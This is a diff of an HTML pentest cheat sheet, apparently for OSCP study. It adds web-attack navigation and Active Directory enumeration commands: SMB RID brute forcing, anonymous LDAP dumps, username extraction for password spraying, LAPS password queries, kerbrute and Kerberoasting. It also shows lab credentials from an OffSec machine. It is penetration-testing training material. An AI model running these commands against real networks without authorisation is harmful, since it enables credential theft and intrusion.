@@ -10,23 +10,55 @@
 <body>
 
         <nav>
-                <a href="index.html">Home</a>
+        <a href="index.html">Home</a>
 
-                <div class="dropdown">
-                        <a href="#">AD ▾</a>
-                        <div class="dropdown-content">
-                                <a href="enumeration.html">Enumeration</a>
-                                <a href="attacking.html">Attacking</a>
-                                <a href="lateralMovement.html">Lateral Movement</a>
-                                <a href="metodologie.html">Methodology</a>
-                        </div>
-                </div>
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Privesc ▾</a>
+            <div class="dropdown-content">
                 <a href="windows_privesc.html">Windows PrivEsc</a>
                 <a href="linux-privesc.html">Linux Privesc</a>
-                <a href="file-transfer.html">File Transfer</a>
-                <a href="checklist.html">Checklist</a>
-                <a href="pivoting.html">Pivoting</a>
-        </nav>
+            </div>
+        </div>
+        <div class="dropdown">
+            <a href="#">Web ▾</a>
+
+            <div class="dropdown-content">
+
+                <div class="dropdown-sub">
+                    <a href="#">Finger Printing ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="directoryBruteForce.html">Directory Brute Force</a>
+                    </div>
+                </div>
+
+                 <div class="dropdown-sub">
+                    <a href="#">Attacks ▾</a>
+
+                    <div class="dropdown-subcontent">
+                        <a href="directoryTraversal.html">Directory Travresal</a>
+                        <a href="fileInclusions.html">File Inclusions</a>
+                        <a href="fileUpload.html">File Uploads</a>
+                        <a href="osCommand.html">OS Command Injections</a>
+                        <a href="sqli.html">SQL Injections</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+        <a href="pivoting.html">Pivoting</a>
+    </nav>
         <div class="search-bar">
                 <input type="text" id="global-search" placeholder="Buscar..." />
                 <button onclick="performSearch()">🔍 Search</button>
@@ -407,6 +439,7 @@ nmap -p- --min-rate 5000 -T4 &lt;IP&gt;
                                 <p>Service scan</p>
                                 <pre><code>
 nmap -sCV -p &lt;ports&gt; &lt;IP&gt;
+nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) IP -oN services
                 </code></pre>
 
                                 <p>Important AD ports</p>
@@ -423,27 +456,111 @@ nmap -sCV -p &lt;ports&gt; &lt;IP&gt;
                                 <h3>SMB Anonymous</h3>
                                 <pre><code>
 smbclient -L //&lt;IP&gt; -N
+smbclient //&lt;IP&gt;/&lt;Share&gt; -N
 crackmapexec smb &lt;IP&gt; --shares -u '' -p ''
+crackmapexec smb &lt;IP&gt; -u 'a' -p '' -d 'domain.com' --rid-brute
 enum4linux -a &lt;IP&gt;
+enum4linux -u domain.com\\guest -a &lt;IP&gt;
+smbmap -u anonymous -H &lt;IP&gt;
                 </code></pre>
 
-                                <h3>LDAP Anonymous</h3>
-                                <pre><code>
-ldapsearch -x -H ldap://&lt;IP&gt; -s base
-                </code></pre>
+                                <h3>LDAP Enumeration (OSCP Workflow)</h3>
 
-                                <p>Extract base DN (example)</p>
-                                <pre><code>
-rootDomainNamingContext: DC=corp,DC=com
-                </code></pre>
+                                <h4>1. LDAP Anonymous - Discover Base DN</h4>
+                                <pre><code>ldapsearch -x -H ldap://&lt;IP&gt; -s base</code></pre>
 
-                                <pre><code>
-ldapsearch -x -H ldap://&lt;IP&gt; -b "DC=corp,DC=com"
-                </code></pre>
+                                <p>Example output:</p>
+                                <pre><code>rootDomainNamingContext: DC=hutch,DC=offsec</code></pre>
+
+                                <p>Use the Base DN for further queries:</p>
+                                <pre><code>ldapsearch -x -H ldap://&lt;IP&gt; -b "DC=hutch,DC=offsec"</code></pre>
+
+
+                                <h4>2. Anonymous LDAP Dump (Initial Enumeration)</h4>
+                                <pre><code>ldapsearch -x -H ldap://192.168.176.122 -b "DC=hutch,DC=offsec"</code></pre>
+
+                                <p>What to look for:</p>
+                                <ul>
+                                        <li>User accounts</li>
+                                        <li>Descriptions (often contain passwords)</li>
+                                        <li>Groups</li>
+                                        <li>Computer objects</li>
+                                </ul>
+
+
+                                <h4>3. Extract Users</h4>
+                                <pre><code>ldapsearch -x -H ldap://192.168.176.122 \
+-b "DC=hutch,DC=offsec" \
+-s sub "(&(objectClass=user))" \
+| grep sAMAccountName: | cut -f2 -d" "</code></pre>
+
+                                <p>Use this to build a valid username list for:</p>
+                                <ul>
+                                        <li>Password spraying</li>
+                                        <li>Kerberoasting</li>
+                                        <li>AS-REP roasting</li>
+                                </ul>
+
+
+                                <h4>4. Find Credentials in Attributes</h4>
+                                <p>Example where credentials were found:</p>
+                                <pre><code>description: Password set to CrabSharkJellyfish192 at user's request</code></pre>
+
+                                <p>This is a common misconfiguration in lab environments.</p>
+
+
+                                <h4>5. Authenticate to LDAP</h4>
+                                <pre><code>ldapsearch -x -H ldap://192.168.176.122 \
+-D "fmcsorley@hutch.offsec" \
+-w "CrabSharkJellyfish192" \
+-b "DC=hutch,DC=offsec"</code></pre>
+
+                                <p>Once authenticated, more sensitive attributes become visible.</p>
+
+
+                                <h4>6. Enumerate Computer Objects (Important for LAPS)</h4>
+                                <pre><code>ldapsearch -x -H ldap://192.168.176.122 \
+-D "fmcsorley@hutch.offsec" \
+-w "CrabSharkJellyfish192" \
+-b "DC=hutch,DC=offsec" \
+"(objectClass=computer)" \
+dNSHostName ms-Mcs-AdmPwd</code></pre>
+
+                                <p>This query targets computers and requests the LAPS attribute:</p>
+                                <ul>
+                                        <li><code>ms-Mcs-AdmPwd</code> → Local Administrator Password (LAPS)</li>
+                                </ul>
+
+
+                                <h4>7. Example LAPS Output</h4>
+                                <pre><code>dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
+dNSHostName: hutchdc.hutch.offsec
+ms-Mcs-AdmPwd: [(5G}4N6E{]hx1</code></pre>
+
+                                <p>This password can be used to authenticate as a local administrator on the machine.
+                                </p>
+
+
+                                <h4>8. Key Takeaways (OSCP Mindset)</h4>
+                                <ul>
+                                        <li>Always start with anonymous LDAP if possible</li>
+                                        <li>Extract Base DN before querying</li>
+                                        <li>Look for credentials in attributes like <code>description</code></li>
+                                        <li>Authenticate with valid creds to unlock more data</li>
+                                        <li>Query <code>objectClass=computer</code> to find LAPS</li>
+                                        <li>Search for sensitive attributes such as <code>ms-Mcs-AdmPwd</code></li>
+                                </ul>
+
+
 
                                 <h3>Kerberos User Enumeration</h3>
                                 <pre><code>
 kerbrute userenum -d corp.com users.txt --dc &lt;IP&gt;
+
+kerbrute userenum -d nagoya-industries.com users --dc 192.168.209.21 \
+| grep "VALID USERNAME" \
+| awk '{print $NF}' \
+| cut -d'@' -f1 &gt; valid_users.txt
                 </code></pre>
 
                                 <h3>AS-REP Roasting</h3>
@@ -497,7 +614,7 @@ ldapsearch -x -H ldap://&lt;IP&gt; \
 
                                 <h3>Kerberoasting</h3>
                                 <pre><code>
-impacket-GetUserSPNs corp.com/user:Password123! -dc-ip &lt;IP&gt;
+impacket-GetUserSPNs corp.com/user:Password123! -dc-ip &lt;IP&gt; -request
                 </code></pre>
 
                                 <p>Crack SPN hash</p>
